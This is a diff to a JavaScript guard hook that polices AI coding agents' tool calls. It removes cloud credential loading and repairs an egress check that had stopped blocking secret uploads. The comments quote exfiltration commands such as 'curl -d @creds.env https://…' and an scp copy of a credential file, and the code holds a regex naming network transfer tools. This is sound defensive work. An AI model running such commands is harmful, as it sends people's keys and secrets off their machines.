@@ -7,24 +7,22 @@
  *
  * WHERE THE POLICY COMES FROM, in order:
  *
- *   1. a service, when one is configured — a credential in ~/.solongate, or
- *      SOLONGATE_API_URL, or a .env. Cached ~10s and refreshed off the hot path,
- *      so a tool call never waits on the network to be decided.
- *   2. ~/.solongate/policy.json — this machine's own file.
- *   3. policy.json beside the working directory, which may add RULES and nothing
- *      else: it lives in a repository the agent can write to.
+ *   1. ~/.solongate/policy.json — this machine's own file.
+ *   2. policy.json beside the working directory, which may add RULES and nothing
+ *      else: it lives in a repository the agent can write to, so `selfProtect`
+ *      and `security` there are ignored — the thing being policed does not get
+ *      to switch off the policing.
  *
- * NONE OF THEM IS REQUIRED, and no credential is needed for the first to be
- * absent. A machine that has only the file is the ordinary deployment, not a
- * broken one, and everything it writes stays on it. With no policy at all there
- * is nothing to enforce and the call is allowed.
+ * There used to be a step above both: a service, when a credential named one,
+ * cached for ten seconds and refreshed off the hot path. It is gone, and so is
+ * everything that reached it. NEITHER FILE IS REQUIRED — with no policy at all
+ * there is nothing to enforce and the call is allowed.
  *
  * The engine is the same whichever answered: OPA WASM, NIST SP 800-207 PDP,
  * fail-closed. Routing is binary — WHITE (allow) / BLACK (block). Nothing is
  * escalated to a model and there is no judge.
  *
- * Denials are recorded. To disk when there is no service to send them to, which
- * is also the only place they can go then; to the service otherwise. ALLOWs are
+ * Denials are recorded to disk, which is the only place they go. ALLOWs are
  * recorded by audit.mjs.
  *
  * There is a Go twin of all of this in packages/guard-go, deliberately identical,
@@ -44,6 +42,7 @@ import {
   evaluate,
   extractCommands,
   extractFilenames,
+  extractPipelines,
   extractPaths,
   extractUrls,
   guessPermission,
@@ -117,9 +116,17 @@ import { createHash } from 'node:crypto';
 // before the egress scan read it. Both are resource fixes on agent-supplied
 // input: see dlpGlobToRe and DLP_MAX_FILE_BYTES.
 //
-// An installed hook self-updates on this number, and a disarm nobody picks up is
-// not fixed.
-const HOOK_VERSION = 98;
+// 99 RESTORES THE EGRESS CHECK, which had stopped running altogether. It lived
+// inside a fast path that first read a policy CACHE and gave up when there was
+// none, and nothing writes that cache any more -- so a `curl -d @creds.env
+// https://...` uploading a file full of keys was allowed, with dlpBlock configured
+// and working everywhere else. The Go guard blocked it, so the two disagreed about
+// a secret leaving the machine. 99 also stops this hook reading a credential at
+// all: two file reads leave the hot path of every tool call.
+//
+// This number is how a machine compares the hook it has with the one in a
+// checkout, and a fix nobody picks up is not a fix.
+const HOOK_VERSION = 99;
 
 // SG_DIR_MODE is the mode for ~/.solongate.
 //
@@ -177,13 +184,16 @@ const SG_FILE_MODE = 0o600;
 // SOLONGATE_NO_GO_GUARD=1 pins execution to Node. It exists so a failure can be
 // bisected without uninstalling anything.
 
-// The refresh invocation has no tool call on stdin — it is spawned detached and
-// its stdin may be a pipe nobody ever closes, so reading it would hang the hook
-// forever. It also has nothing for the binary to decide. Both paths skip it.
-const SG_REFRESH_ARG = process.argv.includes('--sg-refresh-policy');
-
 // The one read of fd 0 in this process. Everything downstream uses this string.
-const SG_STDIN = SG_REFRESH_ARG ? '' : (() => {
+//
+// It used to be conditional. `guard.mjs <client> --sg-refresh-policy` was a second
+// way to invoke this file — spawned detached by the installer, once per registered
+// client, to fetch the policy so the first real tool call was judged against
+// something instead of being waved through while the fetch ran. That invocation had
+// no tool call on stdin, and its stdin was a pipe nobody closed, so reading it would
+// have hung the hook forever; hence the branch. There is nothing to fetch and no
+// cache to warm, both installers stopped spawning it, and a file needs no warming.
+const SG_STDIN = (() => {
   try { return readFileSync(0, 'utf-8'); } catch { return ''; }
 })();
 
@@ -294,7 +304,7 @@ function sgTryGoGuard() {
   }
 }
 
-if (!SG_REFRESH_ARG && process.env.SOLONGATE_NO_GO_GUARD !== '1') {
+if (process.env.SOLONGATE_NO_GO_GUARD !== '1') {
   // A throw anywhere in here is a bug in the fast path, and a bug in the fast
   // path must not become an unguarded tool call.
   try { sgTryGoGuard(); } catch {}
@@ -407,26 +417,18 @@ function resolveLocalLogDir(rawPath) {
 // Local log storage (opt-in): write solongate-audit.jsonl inside the user's
 // chosen FOLDER. The audit hook does the ALLOW path; the guard does DENY (a
 // blocked call never reaches PostToolUse). `security` is the resolved config.
-/**
- * Short, non-reversible mark of the account an entry belongs to.
- *
- * The machine-local log is one file, and nothing in a line said which account
- * produced it, so after pairing a different account the viewers presented the
- * previous one's calls as yours. Stamping each line lets a reader keep only its
- * own without deleting anybody's history. It is a hash prefix, never the key.
- */
-function accountMark() {
-  try {
-    return API_KEY ? createHash('sha256').update(API_KEY).digest('hex').slice(0, 16) : '';
-  } catch {
-    return '';
-  }
-}
+// accountMark lived here: a 16-character hash prefix of the key, stamped onto every
+// local log line as `acct`. The machine-local log is one file, and after pairing a
+// different account the viewers presented the previous one's calls as yours — so a
+// reader could keep its own lines without deleting anybody's history.
+//
+// There is one account's worth of calls on a machine now, and it is not an account:
+// nothing pairs, nothing reads `acct`, and the only thing left that wanted a
+// credential was this. Its removal is what lets the guard stop reading a credential
+// file on the hot path of every tool call.
 
 function writeLocalLog(security, entry) {
   try {
-    const mark = accountMark();
-    if (mark) entry = { ...entry, acct: mark };
     const l = security && security.localLogs;
     // No usable folder in the resolved config. The answer can still be "local is
     // on" from the persisted marker alone, i.e. WITHOUT a resolved config (empty
@@ -471,100 +473,26 @@ function safeReadFileSync(filePath, encoding = 'utf-8') {
   } catch { return ''; }
 }
 
-// ── Load .env file (Claude Code doesn't load .env into process.env) ──
-function loadEnvKey(dir) {
-  try {
-    const envPath = resolve(dir, '.env');
-    if (!existsSync(envPath)) return {};
-    const lines = readFileSync(envPath, 'utf-8').split('\n');
-    const env = {};
-    for (const line of lines) {
-      const m = line.match(/^([A-Z_]+)=(.*)$/);
-      if (m) env[m[1]] = m[2].replace(/^["']|["']$/g, '').trim();
-    }
-    return env;
-  } catch { return {}; }
-}
-
-// ── Global cloud config (~/.solongate/cloud-guard.json) ──
-// A GLOBAL hook runs from an arbitrary cwd every session, so a project-local
-// .env can't be relied on to carry the API key. The global installer writes the
-// key + URL here once; this absolute path is read regardless of cwd. Shape:
-//   { "apiKey": "sg_live_…", "apiUrl": "http://127.0.0.1:3002" }
-function loadGlobalCloudConfig() {
-  try {
-    const p = resolve(homedir(), '.solongate', 'cloud-guard.json');
-    if (!existsSync(p)) return {};
-    const cfg = JSON.parse(readFileSync(p, 'utf-8'));
-    return (cfg && typeof cfg === 'object') ? cfg : {};
-  } catch { return {}; }
-}
-
-// A real cloud key is `sg_live_`/`sg_test_` followed by hex (see generateApiKey:
-// 24 random bytes → 48 hex chars). Template/placeholder values shipped in sample
-// .env files (e.g. `sg_live_your_key_here`) pass a naive truthiness check but are
-// bogus — and because resolution prefers a project .env over the global login
-// credential, a stray placeholder .env would shadow a valid login and 401 every
-// API call, making the guard fail closed on EVERYTHING. Filter to real keys so a
-// placeholder is skipped and the next real candidate (usually the login cred in
-// cloud-guard.json) is used instead.
-function isRealKey(k) {
-  if (typeof k !== 'string') return false;
-  const v = k.trim();
-  if (!/^sg_(live|test)_/.test(v)) return false;
-  const body = v.replace(/^sg_(live|test)_/, '');
-  if (/your_key_here|placeholder|example|^x+$/i.test(body)) return false;
-  return /^[a-f0-9]{16,}$/i.test(body);
-}
-
-
-const hookCwdEarly = process.cwd();
-const dotenv = loadEnvKey(hookCwdEarly);
-const globalCfg = loadGlobalCloudConfig();
-// Resolution order: process env → the LOGIN (global ~/.solongate config) →
-// project-local .env.
+// NO CREDENTIAL IS READ HERE ANY MORE, and two file reads leave the hot path of
+// every tool call with it.
 //
-// The login deliberately outranks .env. It used to be the other way round, and a
-// forgotten key in the folder an agent happened to start in (an old install left
-// one in $HOME) then shadowed the paired credential: every cloud call 401'd, so
-// nothing was logged from that directory while the very same agent logged fine
-// one folder over — with no visible symptom, because enforcement needs no
-// network. A .env is not a file the user is meant to maintain, and logging in
-// must be enough to make logging work everywhere. .env still wins when there is
-// no login at all, which is the case it exists for (air-gapped / CI checkouts).
-// The default is THIS MACHINE, and that is not a preference.
+// What stood here was the resolution of an API key, from three places in a
+// deliberate order — the environment, then ~/.solongate/cloud-guard.json (written by
+// the installer, absolute because a global hook runs from an arbitrary cwd), then a
+// project-local .env. The order mattered: .env used to win, and a forgotten key in
+// the folder an agent happened to start in would shadow the paired credential, so
+// every call from that directory logged nothing while the same agent one folder over
+// logged fine — no symptom, because enforcement never needed the network. There was
+// an isRealKey filter too, so a sample `sg_live_your_key_here` could not shadow a
+// working key and fail every call closed.
 //
-// It was a hosted service, which is the wrong fallback for a program whose
-// ordinary deployment is local: a stray credential in a .env would have sent an
-// audit record to a host the person running this does not operate. README has
-// documented 127.0.0.1:3002 as the default all along — the port apps/system
-// listens on — so the code was the half that disagreed.
-const API_URL = process.env.SOLONGATE_API_URL || globalCfg.apiUrl || dotenv.SOLONGATE_API_URL || 'http://127.0.0.1:3002';
-// Cloud API key (sg_live_… / sg_test_…). The key identifies the project AND
-// authenticates every API call (active policy, compiled WASM, audit logs). When
-// absent, this hook does nothing — a machine with no key is intentionally
-// unenforced (the cloud has no policy to apply). Each candidate is filtered
-// through isRealKey() so a placeholder .env (sg_live_your_key_here) can't shadow
-// the real login credential and force a fail-closed on every call.
-const API_KEY = [process.env.SOLONGATE_API_KEY, globalCfg.apiKey, dotenv.SOLONGATE_API_KEY].find(isRealKey) || '';
-// WHERE the key came from. A project .env silently outranks the login, so a stale
-// key in the folder an agent happens to run from makes every cloud call 401:
-// enforcement still works (it is local) but NOTHING is logged, anywhere, with no
-// visible sign — the same session works fine one directory over. Recording the
-// source lets the 401 handler name the culprit instead of failing mutely.
-const API_KEY_SOURCE = process.env.SOLONGATE_API_KEY && isRealKey(process.env.SOLONGATE_API_KEY)
-  ? 'environment variable SOLONGATE_API_KEY'
-  : isRealKey(globalCfg.apiKey)
-    ? 'login (~/.solongate)'
-    : join(hookCwdEarly, '.' + 'env');
-const API_URL_SOURCE = process.env.SOLONGATE_API_URL
-  ? 'environment variable SOLONGATE_API_URL'
-  : globalCfg.apiUrl
-    ? 'login (~/.solongate)'
-    : join(hookCwdEarly, '.' + 'env');
-// Auth headers attached to every cloud API request. Cloud accepts either the
-// Authorization: Bearer form or X-API-Key; we send both for robustness.
-const AUTH_HEADERS = API_KEY ? { 'Authorization': 'Bearer ' + API_KEY, 'X-API-Key': API_KEY } : {};
+// All of it existed to answer requests that are gone. The last thing holding on was
+// accountMark, which hashed the key into a `acct` stamp on each local log line so a
+// machine paired to two accounts could tell whose calls were whose. There are no
+// accounts, and nothing read the stamp.
+//
+// The cost was not only the code: loadEnvKey and loadGlobalCloudConfig ran a stat
+// and a read each, on every tool call, before a single rule was evaluated.
 
 /**
  * Which clients the guard is REGISTERED for on this machine.
@@ -685,17 +613,22 @@ const AGENT_NAME = process.env.SOLONGATE_AGENT_NAME || process.argv[3] || AGENT_
 //   send that, so the field names here are load-bearing (verified in the agy
 //   1.1.5 binary: AllowTool bool / DenyReason string).
 
-// Terminate the hook WITHOUT forcing process.exit(). On Windows + Node 24, calling
-// process.exit() right after a fetch() (the cloud audit-log POST) aborts with
-// `Assertion failed: !(handle->flags & UV_HANDLE_CLOSING), file src\win\async.c`:
-// the fetch's DNS/socket teardown is still settling in libuv's threadpool and
-// exit() double-closes the loop's async handle. The abort replaces exit code 2, so
-// Claude Code sees a non-blocking hook failure and runs the tool anyway — the guard
-// computes DENY but never blocks. Instead set process.exitCode and let the event
-// loop drain and exit on its own. A latch preserves the FIRST code (so a later
-// allowTool() reached on fall-through can't overwrite a block), SG_DONE unwinds the
-// stack, and an unref'd backstop force-exits only if a handle is stuck — by then
-// the threadpool has drained, so exit() is safe.
+// Terminate the hook WITHOUT forcing process.exit().
+//
+// The reason was a fetch: on Windows + Node 24, process.exit() right after one — the
+// audit POST — aborted with `Assertion failed: !(handle->flags & UV_HANDLE_CLOSING),
+// file src\win\async.c`, because the fetch's DNS and socket teardown was still
+// settling in libuv's threadpool and exit() double-closed the loop's async handle.
+// The abort REPLACED exit code 2, so Claude Code saw a non-blocking hook failure and
+// ran the tool anyway: the guard computed DENY and never blocked.
+//
+// There is no fetch left in this hook. The drain stays anyway, and not out of
+// caution: setting process.exitCode and letting the loop end on its own is what makes
+// the LATCH possible, and the latch is doing the real work here. It preserves the
+// FIRST code, so a later allowTool() reached on a fall-through path cannot overwrite a
+// block — which is a correctness property about the decision, not about libuv.
+// SG_DONE unwinds the stack; the unref'd backstop force-exits only if a handle is
+// stuck.
 const SG_DONE = Symbol('sg-done');
 let _sgDone = false;
 // The decision JSON must be written to stdout AT MOST ONCE. The handler can reach
@@ -706,18 +639,10 @@ let _sgDone = false;
 // trailing allow (or failed on the double object) and ran the blocked tool. This
 // latch guarantees the FIRST decision is the only one on stdout.
 let _decisionEmitted = false;
-// Terminate WITHOUT ever calling process.exit() on the hot path. On Windows + Node
-// 24, process.exit() called in (or right after) the same tick a cloud fetch()
-// settled aborts with `Assertion failed: !(handle->flags & UV_HANDLE_CLOSING),
-// file src\win\async.c`: a libuv threadpool worker (DNS) is still mid-uv_async_send
-// when exit() force-closes the loop's async handle. The abort replaces exit code 2,
-// so Claude Code sees a non-blocking hook failure and runs the tool anyway (guard
-// logs DENY, never blocks). Instead we just set process.exitCode and let the event
-// loop drain — undici unrefs idle sockets, so Node exits on its own within ~1ms of
-// the work finishing, cleanly (no forced teardown → no abort). A latch preserves
-// the FIRST code so a later allowTool() on fall-through can't overwrite a block; an
-// unref'd backstop armed at the top of the handler is the only place exit() may run,
-// and only long after every fetch has settled.
+// Terminate WITHOUT ever calling process.exit() on the hot path — see SG_DONE above
+// for the Windows abort this began as, and for why the latch is the part that still
+// matters now that no request is ever in flight. The unref'd backstop armed at the top
+// of the handler is the only place exit() may run.
 function sgFinish(code) {
   if (!_sgDone) { _sgDone = true; process.exitCode = code; }
   throw SG_DONE;
@@ -1479,7 +1404,11 @@ function egressSecretCheck(args, sec, cwd) {
     // hooks.json directory (~/.gemini/config), so a bare `resolve('config/x')`
     // would look in the wrong place and the egress check would silently miss.
     const base = cwd || process.cwd();
-    for (const cmd of extractCommands(args)) {
+    // PIPELINES, not commands. extractCommands splits on `|` too, which is right for
+    // a policy rule and wrong here: `cat creds.env | curl -d @- https://…` split into
+    // a half with no transfer command and a half whose only file is `-`, so a secret
+    // piped into an upload was seen by neither. Both implementations had it.
+    for (const cmd of extractPipelines(args)) {
       const c = String(cmd || '');
       const lc = c.toLowerCase();
       if (!/\b(curl|wget|scp|rsync|sftp|ftp|nc|netcat)\b/.test(lc)) continue;
@@ -1497,6 +1426,19 @@ function egressSecretCheck(args, sec, cwd) {
         while ((m = re.exec(c))) {
           const f = m[1];
           if (f && f !== '-' && !/^https?:\/\//.test(f) && !/^[@{[]/.test(f)) files.add(f);
+        }
+      }
+      // POSITIONAL sources, for the transfers that take them: `scp creds.env
+      // user@host:/tmp/x` names its file with no flag in front of it, so none of the
+      // regexes above saw it and the commonest way to copy a file off a machine went
+      // unchecked. Every token that could be a path is a candidate; what decides is
+      // still the content scan below, and a token that is not a file fails the stat.
+      if (/\b(scp|rsync|sftp)\b/.test(lc)) {
+        for (const tok of c.split(/\s+/).slice(1)) {
+          if (!tok || tok.startsWith('-')) continue;      // a flag
+          if (/^[\w.-]*@?[\w.-]+:/.test(tok)) continue;    // user@host:path — the DESTINATION
+          if (/^https?:\/\//.test(tok)) continue;
+          files.add(tok.replace(/^@/, ''));
         }
       }
       for (let f of files) {
@@ -2041,52 +1983,30 @@ input += SG_STDIN;
       } catch {}
     }
 
-    // ── FAST tamper path (hook v40) ───────────────────────────────────────
-    // Tamper protection is independent of the cloud policy, so decide it BEFORE
-    // the slow policy resolution (cache read + WASM + background refresh). That
-    // slow work made the earliest guard processes in a concurrent denial burst
-    // exceed Claude Code's PreToolUse hook timeout and get SIGKILLed mid-write,
-    // dropping the local log. Here we cheap-read the cache for selfProtect +
-    // localLogs config and, on a tamper hit, log + block IMMEDIATELY — no WASM,
-    // no refresh — so the process is fast and never killed. Falls through
-    // untouched when there is no tamper hit.
-    try {
-      const _ak = (AGENT_ID || 'default').replace(/[^a-zA-Z0-9_-]/g, '_');
-      const _cf = join(resolve(homedir(), '.solongate'), '.policy-cache-' + _ak + '.json');
-      let _selfProt = true, _sec = null, _cacheOk = false;
-      try {
-        const _c = JSON.parse(readFileSync(_cf, 'utf-8'));
-        _cacheOk = true;
-        if (_c && typeof _c.selfProtect === 'boolean') _selfProt = _c.selfProtect;
-        if (_c && _c.security !== undefined) _sec = _c.security;
-      } catch {}
-      // Only fast-path when we actually read the cache (so _sec is the real
-      // localLogs config). On a cache miss, fall through to the full flow, which
-      // resolves the policy properly and still blocks tamper.
-      const _tr = (_cacheOk && _selfProt) ? tamperCheck(toolName, args) : null;
-      // Egress DLP: block a transfer command that would upload a local secret file.
-      const _er = (!_tr && _cacheOk) ? egressSecretCheck(args, _sec, call.cwd) : null;
-      const _deny = _tr || _er;
-      if (_deny) {
-        const _logEntry = {
-          tool: toolName, arguments: args,
-          decision: 'DENY', reason: _deny,
-          permission: guessPermission(toolName),
-          source: `${AGENT_TYPE}-guard`,
-          agent_id: AGENT_TYPE, agent_name: AGENT_NAME,
-          session_id: call.sessionId,
-          evaluation_time_ms: Date.now() - _evalStart,
-        };
-        try { writeLocalLog(_sec, { ts: new Date().toISOString(), ..._logEntry }); } catch {}
-        try {
-          } catch {}
-        // Not on Codex: its block reason IS the hook's stderr (see the ROUTE
-        // write at the end of the slow path for the full rationale).
-        if (AGENT_TYPE !== 'codex') process.stderr.write(`[SolonGate ROUTE] BLACK (block)\n`);
-        writeDenyFlag(toolName);
-        blockTool(_deny); // throws SG_DONE — skips the slow policy path entirely
-      }
-    } catch (_e) { if (_e === SG_DONE) throw _e; /* else: fall through to full flow */ }
+    // THE FAST TAMPER PATH IS GONE, and removing it fixes an enforcement hole.
+    //
+    // It existed for a real reason: the slow path below used to mean a cache read, an
+    // OPA WASM instantiation and a detached background refresh, and doing all that
+    // before deciding a tamper block made the earliest guard processes in a
+    // concurrent denial burst exceed Claude Code's PreToolUse timeout and get
+    // SIGKILLed partway through writing their log. So tamper — which never depended
+    // on the policy — was decided first, from a cheap read of the policy CACHE.
+    //
+    // Two things changed. The slow path is no longer slow: no WASM, no refresh, one
+    // file read and a deterministic evaluator. And NOTHING WRITES THE CACHE, so the
+    // cheap read always missed — which mattered far more than the speed, because the
+    // egress check was gated on it:
+    //
+    //     const _er = (!_tr && _cacheOk) ? egressSecretCheck(args, _sec, call.cwd) : null;
+    //
+    // _cacheOk was false on every call, so egressSecretCheck NEVER RAN. A `curl -d
+    // @creds.env https://…` that uploads a file holding an AWS key was allowed, with
+    // dlpBlock configured and working for every other surface. The Go twin ran the
+    // same check off the policy file and blocked it — the two disagreed about a
+    // secret leaving the machine, which is the worst place for them to disagree.
+    //
+    // Egress now runs below, from the file, in the Go guard's order: tamper, then
+    // egress, then the layers, then the policy.
 
     // (self-protection + PI hook layers removed per project decision)
 
@@ -2145,11 +2065,16 @@ input += SG_STDIN;
 
     if (process.env.SOLONGATE_DEBUG) {
     }
-    // Tamper / self-protection — runs before policy eval. ON by default; the
-    // per-project cloud setting can disable it (fail safe: stays on if unread).
+    // Tamper / self-protection — runs before policy eval. ON by default; the file
+    // can turn it off (fail safe: stays on if the file is silent or unreadable).
     let reason = selfProtectEnabled ? tamperCheck(toolName, args) : null;
-    // Extra security layers run after tamper, before policy. Block reason wins
-    // immediately (BLACK). Fail-open by design.
+    // A secret leaving the machine in the ARGUMENTS of a call — as opposed to one
+    // read out of a file, which is the redaction plan's job. Second, exactly as in
+    // guard-go/main.go: it is the check with the narrowest trigger (a transfer
+    // command with an outward target) and the heaviest consequence.
+    if (!reason) reason = egressSecretCheck(args, securityCfg, call.cwd);
+    // Extra security layers run after tamper and egress, before policy. A block
+    // reason wins immediately (BLACK). Fail-open by design.
     if (!reason) reason = securityLayerCheck(toolName, args, securityCfg, agentKey);
     if (process.env.SOLONGATE_DEBUG) {
     }
